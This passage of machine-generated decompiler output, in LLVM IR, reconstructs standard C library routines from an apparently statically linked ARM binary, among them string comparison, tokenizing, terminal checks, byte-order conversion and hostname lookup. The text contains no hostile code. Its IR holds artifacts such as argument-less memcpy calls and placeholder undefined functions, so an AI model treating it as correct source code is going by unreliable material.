  %v2_14ea03950 = phi i1 [ %v2_14ea039, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_14e94.pr49 = phi i32 [ %v1_14ea441, %thread-pre-split.loopexit ], [ %v0_14e64, %thread-pre-split.preheader ]
  %v0_14e98648 = phi i32 [ %v1_14e8c, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_1cd10.933 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_14e88

dec_label_pc_14ea0:                               ; preds = %bb
  br i1 %v2_14ea0, label %dec_label_pc_14eac, label %bb27

bb27:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_14ea0
  %v0_14e8c.lcssa56 = phi i32 [ %v1_14e8c, %dec_label_pc_14ea0 ], [ ptrtoint ([8 x i8]* @global_var_1cd10.933 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14ee0

dec_label_pc_14eac:                               ; preds = %dec_label_pc_14ea0, %entry
  %v3_14eb0 = ashr i32 %v0_14e64, 31
  %v5_14ec4 = bitcast i32* %stack_var_-25 to i8*
  %v6_14ec4 = call i32 @_uintmaxtostr(i8* %v5_14ec4, i32 %v0_14e64, i32 %v3_14eb0, i32 -10, i32 0)
  %v1_14ec8 = add i32 %v6_14ec4, -14
  store i32 %v1_14ec8, i32* @r5, align 4
  store i32 %v1_14ec8, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1cd00.935 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_14ed8 = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_14ee0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14ee0

dec_label_pc_14ee0:                               ; preds = %bb27, %dec_label_pc_14eac
  %v0_14ee0 = phi i32 [ %v0_14e8c.lcssa56, %bb27 ], [ %v0_14ee0.pre, %dec_label_pc_14eac ]
  %v1_14ee0 = inttoptr i32 %v0_14ee0 to i8*
  %v3_14ee4 = call i32 @strlen(i8* %v1_14ee0)
  %v0_14ee8 = load i32, i32* @r8, align 4
  %v2_14ee8 = icmp eq i32 %v0_14ee8, 0
  %v1_14eec = add i32 %v3_14ee4, 1
  store i32 %v1_14eec, i32* @r4, align 4
  br i1 %v2_14ee8, label %bb28, label %dec_label_pc_14ee0._crit_edge

dec_label_pc_14ee0._crit_edge:                    ; preds = %dec_label_pc_14ee0
  %v1_14ef4.pre = load i32, i32* @r6, align 4
  br label %bb29

bb28:                                             ; preds = %dec_label_pc_14ee0
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_14ee0._crit_edge, %bb28
  %v4_14ef8 = phi i32 [ %v1_14ef4.pre, %dec_label_pc_14ee0._crit_edge ], [ 0, %bb28 ]
  %tmp57 = icmp ugt i32 %v1_14eec, %v4_14ef8
  br i1 %tmp57, label %bb30, label %.thread17

bb30:                                             ; preds = %bb29
  store i32 %v4_14ef8, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb29, %bb30
  %v0_14f0815 = phi i32 [ %v4_14ef8, %bb30 ], [ %v1_14eec, %bb29 ]
  %v2_14f00 = icmp eq i32 %v0_14f0815, 0
  br i1 %v2_14f00, label %dec_label_pc_14f24, label %dec_label_pc_14f08

dec_label_pc_14f08:                               ; preds = %.thread17
  store i32 %v0_14f0815, i32* @r2, align 4
  %v0_14f0c = load i32, i32* @r5, align 4
  store i32 %v0_14f0c, i32* @r1, align 4
  store i32 %v0_14ee8, i32* @r0, align 4
  %v0_14f14 = call i32 @memcpy()
  %v0_14f18 = load i32, i32* @r8, align 4
  %v1_14f18 = load i32, i32* @r4, align 4
  %v2_14f18 = add i32 %v1_14f18, %v0_14f18
  %v3_14f20 = add i32 %v2_14f18, -1
  %v4_14f20 = inttoptr i32 %v3_14f20 to i8*
  store i8 0, i8* %v4_14f20, align 1
  br label %dec_label_pc_14f24

dec_label_pc_14f24:                               ; preds = %.thread17, %dec_label_pc_14f08
  %v0_14f24 = load i32, i32* %r7.global-to-local, align 4
  %v2_14f24 = icmp eq i32 %v0_14f24, 0
  br i1 %v2_14f24, label %dec_label_pc_14f34, label %dec_label_pc_14f2c

dec_label_pc_14f2c:                               ; preds = %dec_label_pc_14f24
  %v0_14f2c = call i32 @__errno_location()
  %v0_14f30 = load i32, i32* %r7.global-to-local, align 4
  %v2_14f30 = inttoptr i32 %v0_14f2c to i32*
  store i32 %v0_14f30, i32* %v2_14f30, align 4
  %v0_14f34.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14f34

dec_label_pc_14f34:                               ; preds = %dec_label_pc_14f24, %dec_label_pc_14f2c
  %v0_14f34 = phi i32 [ 0, %dec_label_pc_14f24 ], [ %v0_14f34.pre, %dec_label_pc_14f2c ]
  store i32 %v3_14e60, i32* @r4, align 4
  ret i32 %v0_14f34

; uselistorder directives
  uselistorder i32 %v4_14ef8, { 1, 2, 0 }
  uselistorder i32 %v1_14eec, { 1, 0, 2 }
  uselistorder i32 %v1_14e8c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_14e64, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_14f34, { 1, 0 }
  uselistorder label %dec_label_pc_14f24, { 1, 0 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_14ee0, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_14f58

dec_label_pc_14f58:                               ; preds = %bb8, %entry
  %v8_14fbc3 = phi i32 [ %v8_14fbc, %bb8 ], [ 0, %entry ]
  %v0_14fb0 = phi i32 [ %v1_14fb0, %bb8 ], [ %arg2, %entry ]
  %v0_14fb4 = phi i32 [ %v1_14fb4, %bb8 ], [ %tmp, %entry ]
  %v9_14f58 = icmp eq i32 %v0_14fb4, %v0_14fb0
  br i1 %v9_14f58, label %dec_label_pc_14f58._crit_edge, label %dec_label_pc_14f60

dec_label_pc_14f58._crit_edge:                    ; preds = %dec_label_pc_14f58
  %.pre = inttoptr i32 %v0_14fb0 to i8*
  br label %bb8

dec_label_pc_14f60:                               ; preds = %dec_label_pc_14f58
  %v1_14f64 = inttoptr i32 %v0_14fb4 to i8*
  %v2_14f64 = load i8, i8* %v1_14f64, align 1
  %v3_14f64 = zext i8 %v2_14f64 to i32
  %v1_14f68 = inttoptr i32 %v0_14fb0 to i8*
  %v2_14f68 = load i8, i8* %v1_14f68, align 1
  %v3_14f68 = zext i8 %v2_14f68 to i32
  %v2_14f6c = load i32, i32* bitcast (i32** @global_var_2658c.938 to i32*), align 4
  %v2_14f70 = mul nuw nsw i32 %v3_14f64, 2
  %v2_14f74 = mul nuw nsw i32 %v3_14f68, 2
  %v2_14f78 = add i32 %v2_14f74, %v2_14f6c
  %v2_14f7c = add i32 %v2_14f6c, %v2_14f70
  %v1_14f80 = add i32 %v2_14f7c, 1
  %v2_14f80 = inttoptr i32 %v1_14f80 to i8*
  %v3_14f80 = load i8, i8* %v2_14f80, align 1
  %v4_14f80 = zext i8 %v3_14f80 to i32
  %v1_14f84 = add i32 %v2_14f78, 1
  %v2_14f84 = inttoptr i32 %v1_14f84 to i8*
  %v3_14f84 = load i8, i8* %v2_14f84, align 1
  %v4_14f84 = zext i8 %v3_14f84 to i32
  %v3_14f88 = inttoptr i32 %v2_14f78 to i8*
  %v4_14f88 = load i8, i8* %v3_14f88, align 1
  %v6_14f88 = zext i8 %v4_14f88 to i32
  %v3_14f8c = inttoptr i32 %v2_14f7c to i8*
  %v4_14f8c = load i8, i8* %v3_14f8c, align 1
  %v6_14f8c = zext i8 %v4_14f8c to i32
  %v3_14f90 = mul nuw i32 %v4_14f84, 16777216
  %v3_14f94 = mul nuw i32 %v4_14f80, 16777216
  %v4_14f98 = sdiv i32 %v3_14f94, 65536
  %v5_14f98 = or i32 %v6_14f8c, %v4_14f98
  %v4_14f9c = sdiv i32 %v3_14f90, 65536
  %v5_14f9c = or i32 %v4_14f9c, %v6_14f88
  %v2_14fa0 = sub nsw i32 %v5_14f98, %v5_14f9c
  %v9_14fa0 = icmp eq i32 %v5_14f98, %v5_14f9c
  br i1 %v9_14fa0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_14f60
  ret i32 %v2_14fa0

bb8:                                              ; preds = %dec_label_pc_14f58._crit_edge, %dec_label_pc_14f60
  %v1_14fa8.pre-phi = phi i8* [ %.pre, %dec_label_pc_14f58._crit_edge ], [ %v1_14f64, %dec_label_pc_14f60 ]
  %v8_14fbc = phi i32 [ %v8_14fbc3, %dec_label_pc_14f58._crit_edge ], [ %v2_14fa0, %dec_label_pc_14f60 ]
  %v2_14fa8 = load i8, i8* %v1_14fa8.pre-phi, align 1
  %v2_14fac = icmp eq i8 %v2_14fa8, 0
  %v1_14fb0 = add i32 %v0_14fb0, 1
  %v1_14fb4 = add i32 %v0_14fb4, 1
  store i32 %v1_14fb4, i32* @lr, align 4
  br i1 %v2_14fac, label %dec_label_pc_14fbc, label %dec_label_pc_14f58

dec_label_pc_14fbc:                               ; preds = %bb8
  ret i32 %v8_14fbc

; uselistorder directives
  uselistorder i32 %v1_14fb4, { 1, 0 }
  uselistorder i32 %v2_14fa0, { 1, 0 }
  uselistorder i32 %v5_14f9c, { 1, 0 }
  uselistorder i32 %v5_14f98, { 1, 0 }
  uselistorder i32 %v0_14fb0, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_14fd816 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_14fd8.outer

dec_label_pc_14fd8.outer:                         ; preds = %dec_label_pc_15040, %entry
  %v0_14fec.ph = phi i32 [ %v1_15040, %dec_label_pc_15040 ], [ %tmp, %entry ]
  %v2_14fd817 = load i8, i8* %v1_14fd816, align 1
  %v2_14fdc19 = icmp eq i8 %v2_14fd817, 0
  br i1 %v2_14fdc19, label %dec_label_pc_14fec, label %dec_label_pc_14ff4

dec_label_pc_14fec:                               ; preds = %dec_label_pc_14fd8.backedge, %dec_label_pc_14fd8.outer
  ret i32 %v0_14fec.ph

dec_label_pc_14ff4:                               ; preds = %dec_label_pc_14fd8.outer, %dec_label_pc_14fd8.backedge
  %v1_14fe425.in = phi i32 [ %v1_14fe425, %dec_label_pc_14fd8.backedge ], [ %arg2, %dec_label_pc_14fd8.outer ]
  %v2_14fd823 = phi i8 [ %v2_14fd8, %dec_label_pc_14fd8.backedge ], [ %v2_14fd817, %dec_label_pc_14fd8.outer ]
  %v2_14fe024.in.in = phi i8 [ %v2_14fd8, %dec_label_pc_14fd8.backedge ], [ %v2_14fd817, %dec_label_pc_14fd8.outer ]
  %v0_14ffc22 = phi i32 [ %v1_14ffc, %dec_label_pc_14fd8.backedge ], [ %v0_14fec.ph, %dec_label_pc_14fd8.outer ]
  %v1_14fe425 = add i32 %v1_14fe425.in, 1
  %v1_14ff4 = inttoptr i32 %v0_14ffc22 to i8*
  %v2_14ff4 = load i8, i8* %v1_14ff4, align 1
  %v9_14ff8 = icmp eq i8 %v2_14fd823, %v2_14ff4
  %v1_14ffc = add i32 %v0_14ffc22, 1
  br i1 %v9_14ff8, label %dec_label_pc_14fd8.backedge, label %dec_label_pc_15008

dec_label_pc_14fd8.backedge:                      ; preds = %dec_label_pc_14ff4, %dec_label_pc_15008
  %v1_14fd8 = inttoptr i32 %v1_14fe425 to i8*
  %v2_14fd8 = load i8, i8* %v1_14fd8, align 1
  %v2_14fdc = icmp eq i8 %v2_14fd8, 0
  br i1 %v2_14fdc, label %dec_label_pc_14fec, label %dec_label_pc_14ff4

dec_label_pc_15008:                               ; preds = %dec_label_pc_14ff4
  %v2_14fe024.in = zext i8 %v2_14fe024.in.in to i32
  %v3_14ff4 = zext i8 %v2_14ff4 to i32
  %v2_15000 = mul nuw nsw i32 %v3_14ff4, 2
  %v2_14fe024 = mul nuw nsw i32 %v2_14fe024.in, 2
  %v2_1500c = load i32, i32* bitcast (i32** @global_var_2658c.938 to i32*), align 4
  %v2_15010 = add i32 %v2_1500c, %v2_15000
  %v2_15014 = add i32 %v2_1500c, %v2_14fe024
  %v1_15018 = add i32 %v2_15014, 1
  %v2_15018 = inttoptr i32 %v1_15018 to i8*
  %v3_15018 = load i8, i8* %v2_15018, align 1
  %v4_15018 = zext i8 %v3_15018 to i32
  %v1_1501c = add i32 %v2_15010, 1
  %v2_1501c = inttoptr i32 %v1_1501c to i8*
  %v3_1501c = load i8, i8* %v2_1501c, align 1
  %v4_1501c = zext i8 %v3_1501c to i32
  %v3_15020 = inttoptr i32 %v2_15010 to i8*
  %v4_15020 = load i8, i8* %v3_15020, align 1
  %v6_15020 = zext i8 %v4_15020 to i32
  %v3_15024 = inttoptr i32 %v2_15014 to i8*
  %v4_15024 = load i8, i8* %v3_15024, align 1
  %v6_15024 = zext i8 %v4_15024 to i32
  %v3_15028 = mul nuw i32 %v4_15018, 16777216
  %v3_1502c = mul nuw i32 %v4_1501c, 16777216
  %v4_15030 = sdiv i32 %v3_15028, 65536
  %v5_15030 = or i32 %v6_15024, %v4_15030
  %v4_15034 = sdiv i32 %v3_1502c, 65536
  %v5_15034 = or i32 %v4_15034, %v6_15020
  %v9_15038 = icmp eq i32 %v5_15030, %v5_15034
  br i1 %v9_15038, label %dec_label_pc_14fd8.backedge, label %dec_label_pc_15040

dec_label_pc_15040:                               ; preds = %dec_label_pc_15008
  %v1_15040 = add i32 %v0_14fec.ph, 1
  %v2_15044 = icmp eq i8 %v2_14ff4, 0
  br i1 %v2_15044, label %dec_label_pc_15054, label %dec_label_pc_14fd8.outer

dec_label_pc_15054:                               ; preds = %dec_label_pc_15040
  ret i32 0

; uselistorder directives
  uselistorder i8 %v2_14fd8, { 2, 1, 0 }
  uselistorder i8 %v2_14ff4, { 0, 2, 1 }
  uselistorder i32 %v0_14ffc22, { 1, 0 }
  uselistorder i32 %v0_14fec.ph, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14fd8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_14ff4, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2c5f4.941 to i32), i32* @r2, align 4
  %v0_15064 = call i32 @strtok_r()
  %v0_15068 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15068, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_15068 = load i32, i32* @ip, align 4
  %v3_15068 = load i32, i32* @r2, align 4
  %v4_15068 = inttoptr i32 %v3_15068 to i32*
  store i32 %v1_15068, i32* %v4_15068, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_15064

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_15070 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_15070, i32* @r1, align 4
  %v0_15078 = call i32 @__GI_tcgetattr()
  %v1_1507c = sub i32 1, %v0_15078
  %v2_1507c = icmp ult i32 %v0_15078, 2
  br i1 %v2_1507c, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_15088 = phi i32 [ %v1_1507c, %entry ], [ 0, %bb ]
  ret i32 %v5_15088

; uselistorder directives
  uselistorder i32 %v0_15078, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1508c = load i32, i32* @r4, align 4
  %v6_1508c = load i32, i32* @r5, align 4
  %v2_15090 = ptrtoint i32* %stack_var_-56 to i32
  %v0_15094 = load i32, i32* @r1, align 4
  store i32 %v0_15094, i32* %r6.global-to-local, align 4
  %v0_150a0 = load i32, i32* @r0, align 4
  %v3_150a0 = call i32 @ioctl(i32 %v0_150a0, i32 21505, i32 %v2_15090)
  store i32 %v3_150a0, i32* %r7.global-to-local, align 4
  %v2_150a4 = icmp eq i32 %v3_150a0, 0
  %v2_150ac = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_150ac, i32* @r1, align 4
  %v0_150b4 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_150a4, label %dec_label_pc_150bc, label %dec_label_pc_150e8

dec_label_pc_150bc:                               ; preds = %entry
  %v1_150b4 = add i32 %v0_150b4, 17
  %v4_150c4 = zext i8 %tmp to i32
  store i32 %v4_150c4, i32* @r5, align 4
  %v2_150c8 = load i32, i32* %stack_var_-56, align 4
  %v1_150cc = inttoptr i32 %v0_150b4 to i32*
  store i32 %v2_150c8, i32* %v1_150cc, align 4
  %v3_150cc = add i32 %v0_150b4, 4
  %v4_150cc = inttoptr i32 %v3_150cc to i32*
  %v5_150cc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_150cc, i32* %v4_150cc, align 4
  %v6_150cc = add i32 %v0_150b4, 8
  %v7_150cc = inttoptr i32 %v6_150cc to i32*
  %v8_150cc = load i32, i32* @lr, align 4
  store i32 %v8_150cc, i32* %v7_150cc, align 4
  %v0_150d0 = load i32, i32* @r4, align 4
  %v1_150d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_150d0 = add i32 %v1_150d0, 12
  %v3_150d0 = inttoptr i32 %v2_150d0 to i32*
  store i32 %v0_150d0, i32* %v3_150d0, align 4
  %v0_150d4 = load i32, i32* @r5, align 4
  %v1_150d4 = trunc i32 %v0_150d4 to i8
  %v2_150d4 = load i32, i32* %r6.global-to-local, align 4
  %v3_150d4 = add i32 %v2_150d4, 16
  %v4_150d4 = inttoptr i32 %v3_150d4 to i8*
  store i8 %v1_150d4, i8* %v4_150d4, align 1
  %v4_150d8 = call i32 @__GI_mempcpy(i32 %v1_150b4, i32 %v2_150ac, i32 19, i32 %v2_150c8)
  %v0_150dc = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_150e4 = inttoptr i32 %v4_150d8 to i8*
  %v3_150e4 = call i32 @__GI_memset(i8* %v2_150e4, i32 %v0_150dc)
  br label %dec_label_pc_150e8

dec_label_pc_150e8:                               ; preds = %entry, %dec_label_pc_150bc
  %v0_150e8 = phi i32 [ %v3_150a0, %entry ], [ %v0_150dc, %dec_label_pc_150bc ]
  store i32 %v3_1508c, i32* @r4, align 4
  store i32 %v6_1508c, i32* @r5, align 4
  ret i32 %v0_150e8

; uselistorder directives
  uselistorder i32 %v0_150b4, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_150e8, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_15114 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_15114
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_15124 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_15128 = urem i32 %tmp1, 256
  %v5_15128 = or i32 %v4_15128, %v1_15124
  ret i32 %v5_15128

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1514c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_1514c
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_1515c = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_15160 = urem i32 %tmp1, 256
  %v5_15160 = or i32 %v4_15160, %v1_1515c
  ret i32 %v5_15160

; uselistorder directives
  uselistorder i32 65280, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %v3_15168 = load i32, i32* @r4, align 4
  %v6_15168 = load i32, i32* @r5, align 4
  %v9_15168 = load i32, i32* @r6, align 4
  %v0_1516c = load i32, i32* @r0, align 4
  %v2_1518c = call i32 @llvm.bswap.i32(i32 %v0_1516c)
  %v0_15190 = load i32, i32* @r1, align 4
  %v1_15190 = add i32 %v0_15190, 15
  store i32 %v1_15190, i32* @ip, align 4
  br label %dec_label_pc_151bc

dec_label_pc_1519c:                               ; preds = %dec_label_pc_151bc
  %v1_151c0 = urem i32 %v0_151d0, 256
  %v5_151a4 = inttoptr i32 %v0_151dc to i8*
  %v6_151a4 = call i32 @_uintmaxtostr(i8* %v5_151a4, i32 %v1_151c0, i32 0, i32 -10, i32 0)
  %v0_151a8 = load i32, i32* @r6, align 4
  %v2_151a8 = icmp eq i32 %v0_151a8, 0
  %v1_151ac = add i32 %v6_151a4, -1
  store i32 %v1_151ac, i32* @ip, align 4
  br i1 %v2_151a8, label %dec_label_pc_151bc.backedge, label %bb

dec_label_pc_151bc.backedge:                      ; preds = %bb, %dec_label_pc_1519c
  %storemerge.pre = phi i32 [ %storemerge.pre.pre, %bb ], [ %v1_151ac, %dec_label_pc_1519c ]
  %v0_151bc.pre = load i32, i32* @r5, align 4
  %v0_151c0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_151bc

bb:                                               ; preds = %dec_label_pc_1519c
  %v4_151b4 = inttoptr i32 %v0_151a8 to i8*
  store i8 46, i8* %v4_151b4, align 1
  %storemerge.pre.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_151bc.backedge

dec_label_pc_151bc:                               ; preds = %dec_label_pc_151bc.backedge, %entry
  %v0_151dc = phi i32 [ %v1_15190, %entry ], [ %storemerge.pre, %dec_label_pc_151bc.backedge ]
  %storemerge = phi i32 [ 0, %entry ], [ %storemerge.pre, %dec_label_pc_151bc.backedge ]
  %v0_151d0 = phi i32 [ %v2_1518c, %entry ], [ %v0_151c0.pre, %dec_label_pc_151bc.backedge ]
  %v0_151d4 = phi i32 [ 0, %entry ], [ %v0_151bc.pre, %dec_label_pc_151bc.backedge ]
  store i32 %storemerge, i32* @r6, align 4
  %v7_151bc = icmp eq i32 %v0_151d4, 3
  store i1 %v7_151bc, i1* @cpsr_z, align 1
  %v3_151d0 = udiv i32 %v0_151d0, 256
  store i32 %v3_151d0, i32* @r4, align 4
  %v1_151d4 = add i32 %v0_151d4, 1
  store i32 %v1_151d4, i32* @r5, align 4
  %v7_151d8 = icmp sgt i32 %v0_151d4, 3
  br i1 %v7_151d8, label %dec_label_pc_151dc, label %dec_label_pc_1519c

dec_label_pc_151dc:                               ; preds = %dec_label_pc_151bc
  %v1_151dc = add i32 %v0_151dc, 1
  store i32 %v3_15168, i32* @r4, align 4
  store i32 %v6_15168, i32* @r5, align 4
  store i32 %v9_15168, i32* @r6, align 4
  ret i32 %v1_151dc

; uselistorder directives
  uselistorder i32 %v0_151d4, { 2, 0, 1 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
}

define i32 @__GI_inet_ntoa(i32* %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2c5f8.944 to i32), i32* @r1, align 4
  %v0_151ec = call i32 @__GI_inet_ntoa_r()
  %v0_151f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_151f0, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_151f0 = load i32, i32* @ip, align 4
  store i32 %v1_151f0, i32* %arg1, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_151ec

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_151f8 = ptrtoint i32* %stack_var_-8 to i32
  %v0_15200 = load i32, i32* @r0, align 4
  %v2_15200 = inttoptr i32 %v0_15200 to i8*
  %v3_15200 = call i32 @inet_aton(i8* %v2_15200, i32 %v2_151f8)
  %v2_15204 = icmp eq i32 %v3_15200, 0
  br i1 %v2_15204, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_1520c = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_15214 = phi i32 [ -1, %entry ], [ %v3_1520c, %bb ]
  ret i32 %v5_15214

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_15218 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15224 = call i32 @__GI___h_errno_location()
  %v2_15228 = ptrtoint i32* %stack_var_-12 to i32
  %v0_15234 = load i32, i32* @r4, align 4
  %v7_15244 = call i32 @gethostbyname_r(i32 %v0_15234, i32* nonnull @global_var_2c7d4.946, i32 ptrtoint (i32* @global_var_2c608.948 to i32), i32 460, i32 %v2_15228, i32 %v0_15224)
  %v3_15248 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_15218, i32* @r4, align 4
  ret i32 %v3_15248
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_1525c = load i32, i32* @r5, align 4
  %v9_1525c = load i32, i32* @r6, align 4
  %v12_1525c = load i32, i32* @r7, align 4
  %v15_1525c = load i32, i32* @r8, align 4
  %v18_1525c = load i32, i32* @sb, align 4
  %v21_1525c = load i32, i32* @sl, align 4
  %v24_1525c = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_1526c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1526c, i32* @fp, align 4
  %v2_1526c = icmp eq i32 %v0_1526c, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_1527c = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1527c, align 4
  br i1 %v2_1526c, label %bb, label %dec_label_pc_15288

bb:                                               ; preds = %entry
  %v1_15280 = load i32, i32* %r0.global-to-local, align 4
  %v2_15280 = add i32 %v1_15280, 22
  store i32 %v2_15280, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_155ac

dec_label_pc_15288:                               ; preds = %entry
  %v0_15288 = call i32 @__errno_location()
  store i32 %v0_15288, i32* %r0.global-to-local, align 4
  %v3_1528c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1528c, i32* %ip.global-to-local, align 4
  %v1_15290 = inttoptr i32 %v0_15288 to i32*
  %v2_15290 = load i32, i32* %v1_15290, align 4
  store i32 %v2_15290, i32* @r8, align 4
  %v0_15294 = load i32, i32* @r6, align 4
  store i32 %v0_15294, i32* %v1_15290, align 4
  %v0_15298 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_15288, i32* @r5, align 4
  %v0_152a8 = load i32, i32* @fp, align 4
  store i32 %v0_152a8, i32* %r0.global-to-local, align 4
  %v0_152ac = load i32, i32* @sl, align 4
  store i32 %v0_152ac, i32* %r2.global-to-local, align 4
  %v0_152b0 = load i32, i32* @r7, align 4
  store i32 %v0_152b0, i32* %r3.global-to-local, align 4
  %v0_152b4 = load i32, i32* @r4, align 4
  %v7_152bc = call i32 @__get_hosts_byname_r(i32 %v0_152a8, i32 2, i32 %v0_152ac, i32 %v0_152b0, i32 %v0_152b4, i32 %v0_15298, i32 %arg6)
  store i32 %v7_152bc, i32* %r0.global-to-local, align 4
  %v2_152c0 = icmp eq i32 %v7_152bc, 0
  br i1 %v2_152c0, label %dec_label_pc_155ac, label %dec_label_pc_152c8

dec_label_pc_152c8:                               ; preds = %dec_label_pc_15288
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_152cc = inttoptr i32 %arg6 to i32*
  %v2_152cc = load i32, i32* %v1_152cc, align 4
  store i32 %v2_152cc, i32* %r3.global-to-local, align 4
  %v7_152d0 = icmp eq i32 %v2_152cc, 1
  br i1 %v7_152d0, label %dec_label_pc_152f4, label %dec_label_pc_152d8

dec_label_pc_152d8:                               ; preds = %dec_label_pc_152c8
  %v7_152d8 = icmp eq i32 %v2_152cc, 4
  br i1 %v7_152d8, label %dec_label_pc_152f4, label %dec_label_pc_152e0

